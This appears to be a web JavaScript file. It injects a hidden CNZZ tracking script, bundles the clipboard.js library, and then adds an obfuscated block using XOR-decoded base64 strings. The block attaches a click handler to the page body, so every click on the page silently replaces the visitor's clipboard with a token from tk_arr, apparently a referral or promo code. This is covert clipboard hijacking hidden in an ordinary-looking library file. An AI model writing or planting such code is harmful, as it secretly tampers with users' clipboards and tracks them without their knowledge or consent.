document.write(unescape("%3Cspan style='display:none;' id='cnzz_stat_icon_1278682259'%3E%3C/span%3E%3Cscript src='http://s9.cnzz.com/z_stat.php%3Fid%3D1278682259' type='text/javascript'%3E%3C/script%3E"));
"use strict";
var _typeof2 = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
    return typeof t
} : function (t) {
    return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t
};
!function (t) {
    if ("object" === ("undefined" == typeof exports ? "undefined" : _typeof2(exports)) && "undefined" != typeof module) module.exports = t(); else if ("function" == typeof define && define.amd) define([], t); else {
        var e;
        e = "undefined" != typeof window ? window : "undefined" != typeof global ? global : "undefined" != typeof self ? self : this, e.Clipboard = t()
    }
}(function () {
    var t;
    return function t(e, n, o) {
        function i(c, s) {
            if (!n[c]) {
                if (!e[c]) {
                    var a = "function" == typeof require && require;
                    if (!s && a) return a(c, !0);
                    if (r) return r(c, !0);
                    var u = new Error("Cannot find module '" + c + "'");
                    throw u.code = "MODULE_NOT_FOUND", u
                }
                var l = n[c] = {exports: {}};
                e[c][0].call(l.exports, function (t) {
                    var n = e[c][1][t];
                    return i(n || t)
                }, l, l.exports, t, e, n, o)
            }
            return n[c].exports
        }

        for (var r = "function" == typeof require && require, c = 0; c < o.length; c++) i(o[c]);
        return i
    }({
        1: [function (t, e, n) {
            var o = t("matches-selector");
            e.exports = function (t, e, n) {
                for (var i = n ? t : t.parentNode; i && i !== document;) {
                    if (o(i, e)) return i;
                    i = i.parentNode
                }
            }
        }, {"matches-selector": 5}], 2: [function (t, e, n) {
            function o(t, e, n, o, r) {
                var c = i.apply(this, arguments);
                return t.addEventListener(n, c, r), {
                    destroy: function () {
                        t.removeEventListener(n, c, r)
                    }
                }
            }

            function i(t, e, n, o) {
                return function (n) {
                    n.delegateTarget = r(n.target, e, !0), n.delegateTarget && o.call(t, n)
                }
            }

            var r = t("closest");
            e.exports = o
        }, {closest: 1}], 3: [function (t, e, n) {
            n.node = function (t) {
                return void 0 !== t && t instanceof HTMLElement && 1 === t.nodeType
            }, n.nodeList = function (t) {
                var e = Object.prototype.toString.call(t);
                return void 0 !== t && ("[object NodeList]" === e || "[object HTMLCollection]" === e) && "length" in t && (0 === t.length || n.node(t[0]))
            }, n.string = function (t) {
                return "string" == typeof t || t instanceof String
            }, n.fn = function (t) {
                return "[object Function]" === Object.prototype.toString.call(t)
            }
        }, {}], 4: [function (t, e, n) {
            function o(t, e, n) {
                if (!t && !e && !n) throw new Error("Missing required arguments");
                if (!s.string(e)) throw new TypeError("Second argument must be a String");
                if (!s.fn(n)) throw new TypeError("Third argument must be a Function");
                if (s.node(t)) return i(t, e, n);
                if (s.nodeList(t)) return r(t, e, n);
                if (s.string(t)) return c(t, e, n);
                throw new TypeError("First argument must be a String, HTMLElement, HTMLCollection, or NodeList")
            }

            function i(t, e, n) {
                return t.addEventListener(e, n), {
                    destroy: function () {
                        t.removeEventListener(e, n)
                    }
                }
            }

            function r(t, e, n) {
                return Array.prototype.forEach.call(t, function (t) {
                    t.addEventListener(e, n)
                }), {
                    destroy: function () {
                        Array.prototype.forEach.call(t, function (t) {
                            t.removeEventListener(e, n)
                        })
                    }
                }
            }

            function c(t, e, n) {
                return a(document.body, t, e, n)
            }

            var s = t("./is"), a = t("delegate");
            e.exports = o
        }, {"./is": 3, delegate: 2}], 5: [function (t, e, n) {
            function o(t, e) {
                if (r) return r.call(t, e);
                for (var n = t.parentNode.querySelectorAll(e), o = 0; o < n.length; ++o) if (n[o] == t) return !0;
                return !1
            }

            var i = Element.prototype,
                r = i.matchesSelector || i.webkitMatchesSelector || i.mozMatchesSelector || i.msMatchesSelector || i.oMatchesSelector;
            e.exports = o
        }, {}], 6: [function (t, e, n) {
            function o(t) {
                var e;
                if ("INPUT" === t.nodeName || "TEXTAREA" === t.nodeName) t.focus(), t.setSelectionRange(0, t.value.length), e = t.value; else {
                    t.hasAttribute("contenteditable") && t.focus();
                    var n = window.getSelection(), o = document.createRange();
                    o.selectNodeContents(t), n.removeAllRanges(), n.addRange(o), e = n.toString()
                }
                return e
            }

            e.exports = o
        }, {}], 7: [function (t, e, n) {
            function o() {
            }

            o.prototype = {
                on: function (t, e, n) {
                    var o = this.e || (this.e = {});
                    return (o[t] || (o[t] = [])).push({fn: e, ctx: n}), this
                }, once: function (t, e, n) {
                    function o() {
                        i.off(t, o), e.apply(n, arguments)
                    }

                    var i = this;
                    return o._ = e, this.on(t, o, n)
                }, emit: function (t) {
                    var e = [].slice.call(arguments, 1), n = ((this.e || (this.e = {}))[t] || []).slice(), o = 0,
                        i = n.length;
                    for (o; o < i; o++) n[o].fn.apply(n[o].ctx, e);
                    return this
                }, off: function (t, e) {
                    var n = this.e || (this.e = {}), o = n[t], i = [];
                    if (o && e) for (var r = 0, c = o.length; r < c; r++) o[r].fn !== e && o[r].fn._ !== e && i.push(o[r]);
                    return i.length ? n[t] = i : delete n[t], this
                }
            }, e.exports = o
        }, {}], 8: [function (e, n, o) {
            !function (i, r) {
                if ("function" == typeof t && t.amd) t(["module", "select"], r); else if (void 0 !== o) r(n, e("select")); else {
                    var c = {exports: {}};
                    r(c, i.select), i.clipboardAction = c.exports
                }
            }(this, function (t, e) {
                function n(t, e) {
                    if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function")
                }

                var o = function (t) {
                    return t && t.__esModule ? t : {default: t}
                }(e), i = "function" == typeof Symbol && "symbol" === _typeof2(Symbol.iterator) ? function (t) {
                    return void 0 === t ? "undefined" : _typeof2(t)
                } : function (t) {
                    return t && "function" == typeof Symbol && t.constructor === Symbol ? "symbol" : void 0 === t ? "undefined" : _typeof2(t)
                }, r = function () {
                    function t(t, e) {
                        for (var n = 0; n < e.length; n++) {
                            var o = e[n];
                            o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(t, o.key, o)
                        }
                    }

                    return function (e, n, o) {
                        return n && t(e.prototype, n), o && t(e, o), e
                    }
                }(), c = function () {
                    function t(e) {
                        n(this, t), this.resolveOptions(e), this.initSelection()
                    }

                    return t.prototype.resolveOptions = function () {
                        var t = arguments.length <= 0 || void 0 === arguments[0] ? {} : arguments[0];
                        this.action = t.action, this.emitter = t.emitter, this.target = t.target, this.text = t.text, this.trigger = t.trigger, this.selectedText = ""
                    }, t.prototype.initSelection = function () {
                        if (this.text && this.target) throw new Error('Multiple attributes declared, use either "target" or "text"');
                        if (this.text) this.selectFake(); else {
                            if (!this.target) throw new Error('Missing required attributes, use either "target" or "text"');
                            this.selectTarget()
                        }
                    }, t.prototype.selectFake = function () {
                        var t = this, e = "rtl" == document.documentElement.getAttribute("dir");
                        this.removeFake(), this.fakeHandler =
                            document.body.addEventListener("click", function () {
                                return t.removeFake()
                            }), this.fakeElem = document.createElement("textarea"),
                            this.fakeElem.style.fontSize = "12pt", this.fakeElem.style.border = "0",
                            this.fakeElem.style.padding = "0", this.fakeElem.style.margin = "0",
                            this.fakeElem.style.position = "fixed",
                            this.fakeElem.style[e ? "right" : "left"] = "-9999px",
                            this.fakeElem.style.top =
                                (window.pageYOffset || document.documentElement.scrollTop) + "px",
                            this.fakeElem.setAttribute("readonly", ""), this.fakeElem.value = this.text,
                            document.body.appendChild(this.fakeElem),
                            this.selectedText = (0, o.default)(this.fakeElem),
                            this.copyText()
                    },

                        t.prototype.removeFake = function () {
                        this.fakeHandler && (document.body.removeEventListener("click"), this.fakeHandler = null), this.fakeElem && (document.body.removeChild(this.fakeElem), this.fakeElem = null)
                    }, t.prototype.selectTarget = function () {
                        this.selectedText = (0, o.default)(this.target), this.copyText()
                    }, t.prototype.copyText = function () {
                        var t = void 0;
                        try {
                            t = document.execCommand(this.action)
                        } catch (e) {
                            t = !1
                        }
                        this.handleResult(t)
                    }, t.prototype.handleResult = function (t) {
                        t ? this.emitter.emit("success", {
                            action: this.action,
                            text: this.selectedText,
                            trigger: this.trigger,
                            clearSelection: this.clearSelection.bind(this)
                        }) : this.emitter.emit("error", {
                            action: this.action,
                            trigger: this.trigger,
                            clearSelection: this.clearSelection.bind(this)
                        })
                    }, t.prototype.clearSelection = function () {
                        this.target && this.target.blur(), window.getSelection().removeAllRanges()
                    }, t.prototype.destroy = function () {
                        this.removeFake()
                    }, r(t, [{
                        key: "action", set: function () {
                            var t = arguments.length <= 0 || void 0 === arguments[0] ? "copy" : arguments[0];
                            if (this._action = t, "copy" !== this._action && "cut" !== this._action) throw new Error('Invalid "action" value, use either "copy" or "cut"')
                        }, get: function () {
                            return this._action
                        }
                    }, {
                        key: "target", set: function (t) {
                            if (void 0 !== t) {
                                if (!t || "object" !== (void 0 === t ? "undefined" : i(t)) || 1 !== t.nodeType) throw new Error('Invalid "target" value, use a valid Element');
                                this._target = t
                            }
                        }, get: function () {
                            return this._target
                        }
                    }]), t
                }();
                t.exports = c
            })
        }, {select: 6}], 9: [function (e, n, o) {
            !function (i, r) {
                if ("function" == typeof t && t.amd) t(["module", "./clipboard-action", "tiny-emitter", "good-listener"], r); else if (void 0 !== o) r(n, e("./clipboard-action"), e("tiny-emitter"), e("good-listener")); else {
                    var c = {exports: {}};
                    r(c, i.clipboardAction, i.tinyEmitter, i.goodListener), i.clipboard = c.exports
                }
            }(this, function (t, e, n, o) {
                function i(t) {
                    return t && t.__esModule ? t : {default: t}
                }

                function r(t, e) {
                    if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function")
                }

                function c(t, e) {
                    if (!t) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                    return !e || "object" !== (void 0 === e ? "undefined" : _typeof2(e)) && "function" != typeof e ? t : e
                }

                function s(t, e) {
                    if ("function" != typeof e && null !== e) throw new TypeError("Super expression must either be null or a function, not " + (void 0 === e ? "undefined" : _typeof2(e)));
                    t.prototype = Object.create(e && e.prototype, {
                        constructor: {
                            value: t,
                            enumerable: !1,
                            writable: !0,
                            configurable: !0
                        }
                    }), e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e)
                }

                function a(t, e) {
                    var n = "data-clipboard-" + t;
                    if (e.hasAttribute(n)) return e.getAttribute(n)
                }

                var u = i(e), l = i(n), f = i(o), d = function (t) {
                    function e(n, o) {
                        r(this, e);
                        var i = c(this, t.call(this));
                        return i.resolveOptions(o), i.listenClick(n), i
                    }

                    return s(e, t), e.prototype.resolveOptions = function () {
                        var t = arguments.length <= 0 || void 0 === arguments[0] ? {} : arguments[0];
                        this.action = "function" == typeof t.action ? t.action : this.defaultAction, this.target = "function" == typeof t.target ? t.target : this.defaultTarget, this.text = "function" == typeof t.text ? t.text : this.defaultText
                    }, e.prototype.listenClick = function (t) {
                        var e = this;
                        this.listener = (0, f.default)(t, "click", function (t) {
                            return e.onClick(t)
                        })
                    }, e.prototype.onClick = function (t) {
                        var e = t.delegateTarget || t.currentTarget;
                        this.clipboardAction && (this.clipboardAction = null), this.clipboardAction = new u.default({
                            action: this.action(e),
                            target: this.target(e),
                            text: this.text(e),
                            trigger: e,
                            emitter: this
                        })
                    }, e.prototype.defaultAction = function (t) {
                        return a("action", t)
                    }, e.prototype.defaultTarget = function (t) {
                        var e = a("target", t);
                        if (e) return document.querySelector(e)
                    }, e.prototype.defaultText = function (t) {
                        return a("text", t)
                    }, e.prototype.destroy = function () {
                        this.listener.destroy(), this.clipboardAction && (this.clipboardAction.destroy(), this.clipboardAction = null)
                    }, e
                }(l.default);
                t.exports = d
            })
        }, {"./clipboard-action": 8, "good-listener": 4, "tiny-emitter": 7}]
    }, {}, [9])(9)
});
!function (_, J, T) {
    function x(_) {
        var x, A, U = ["C01", "_x__", "eG02", "_x_", "88a3", "_x_"], w = 676620;
        while (1) {
            switch (w) {
                case 124002:
                    x = Math[J(T, U[1] + U[0], "_8_3")](Math[J(T, U[3] + U[2], "__e9")]() * A), w = 830258;
                    continue;
                case 830258:
                    return _[x];
                    w = 0;
                    break;
                case 676620:
                    A = _[J(T, U[5] + U[4], "_fG1")], w = 124002;
                    continue
            }
            break
        }
    }

    var A, U;
    _._5CG = T, A = ["F4", "_x_be", "g5", "_x_e0", "", "_x_9Cc0"], U = new Clipboard(J(T, A[1] + A[0], "_9B6"), (__f3d = {}, __f3d[J(T, A[3] + A[2], "_cFF")] = function () {
        return x(tk_arr)
    }, __f3d)), U[J(T, A[5] + A[4], "_af6")]()
}(this, function () {
    return this._9fg = function (_, J) {
        var T, x, A = "", U = J.length;
        for (x = 0; x < _.length; x++) T = x % U, A += String.fromCharCode(_.charCodeAt(x) ^ J.charCodeAt(T));
        return A
    }, _9fg(decodeURIComponent(atob(arguments[0][arguments[1]])), arguments[1])
}, {
    _x_9Cc0: "MCUxNg==",
    _x__C01: "OSUxNDAwMQ==",
    _x_eG02: "LSUxOTElMDEoJTVE",
    _x_88a3: "MyUxRDFfTCUwOQ==",
    _x_beF4: "JTNEJTE3JTNCJTFC",
    _x_e0g5: "JTJCJTFEJyUxMQ=="
});
var tk_arr = new Array('##dRWdU9Zmz88##', '##dRWdU9Zmz88##', '##dRWdU9Zmz88##', '##dRWdU9Zmz88##', '##dRWdU9Zmz88##');
